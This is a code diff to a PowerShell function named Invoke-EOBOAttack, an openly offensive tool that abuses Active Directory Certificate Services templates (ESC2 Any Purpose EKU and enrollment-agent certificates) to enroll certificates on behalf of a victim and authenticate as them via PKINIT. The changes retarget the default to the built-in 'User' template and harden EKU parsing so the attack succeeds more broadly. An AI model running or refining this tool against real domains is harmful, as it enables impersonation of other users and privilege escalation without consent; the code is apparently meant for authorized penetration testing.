@@ -28,8 +28,9 @@ function Invoke-EOBOAttack {
         enrollable by the current principal). Used to obtain the enrollment-agent cert.
 
         .PARAMETER TargetTemplateName
-        Name of the agent-protected template to enroll the victim into (e.g. a schema v1
-        'User'-class template with msPKI-RA-Signature >= 1). Defaults to 'UserEOBO'.
+        Name of the template to enroll the victim into via EOBO. Schema v1 templates such as
+        the built-in 'User' template accept an enrollment-agent (EOBO) request even without
+        requiring an agent signature (msPKI-RA-Signature = 0). Defaults to 'User'.
 
         .PARAMETER CertificateAuthority
         CA configuration string "CA-SERVER\CA-NAME". Auto-discovered if omitted.
@@ -48,7 +49,7 @@ function Invoke-EOBOAttack {
 
         .EXAMPLE
         $agent = Get-AdcsObjects | Where-Object { $_.Properties['name'].Value -eq 'AgentAnyPurpose' }
-        Invoke-EOBOAttack -AgentTemplateObject $agent -TargetTemplateName 'UserEOBO'
+        Invoke-EOBOAttack -AgentTemplateObject $agent -TargetTemplateName 'User'
 
         .NOTES
         WARNING: real certificate enrollment + PKINIT authentication. Authorized use only.
@@ -65,7 +66,7 @@ function Invoke-EOBOAttack {
 
         [Parameter()]
         [ValidateNotNullOrEmpty()]
-        [string]$TargetTemplateName = 'UserEOBO',
+        [string]$TargetTemplateName = 'User',
 
         [Parameter()]
         [string]$CertificateAuthority,
@@ -114,7 +115,9 @@ function Invoke-EOBOAttack {
         }
 
         # Confirm ESC2 primitive: Any Purpose EKU or no EKU
-        $ekus = @($AgentTemplateObject.Properties['pKIExtendedKeyUsage'].Value)
+        $ekuRaw = $AgentTemplateObject.Properties['pKIExtendedKeyUsage']
+        $ekus = @()
+        if ($ekuRaw) { foreach ($e in $ekuRaw) { if ($null -ne $e) { $ekus += "$e" } } }
         $anyPurpose = ($ekus -contains '2.5.29.37.0') -or ($ekus.Count -eq 0)
         if (-not $anyPurpose) {
             Write-Warning "Template '$agentTemplateName' is not Any-Purpose/no-EKU (EKUs: $($ekus -join ', ')). ESC2 may not apply."
@@ -180,7 +183,8 @@ function Invoke-EOBOAttack {
             $agentEnrollment = $agentReq.Enrollment
             $agentCertObj = [System.Security.Cryptography.X509Certificates.X509Certificate2]::new([Convert]::FromBase64String(($agentB64 -replace '\s','')))
             $agentThumb = $agentCertObj.Thumbprint
-            $agentEku = ($agentCertObj.Extensions | Where-Object { $_.Oid.Value -eq '2.5.29.37' }).Format($false)
+            $agentEkuExt = $agentCertObj.Extensions | Where-Object { $_.Oid.Value -eq '2.5.29.37' }
+            $agentEku = if ($agentEkuExt) { $agentEkuExt.Format($false) } else { '(none - Any Purpose)' }
             Write-Host "[+] Agent cert issued: $agentThumb (EKU $agentEku)" -ForegroundColor Green
 
             # --- Step 2: build inner target CSR (CertEnroll) + EOBO CMC co-signed by agent ---
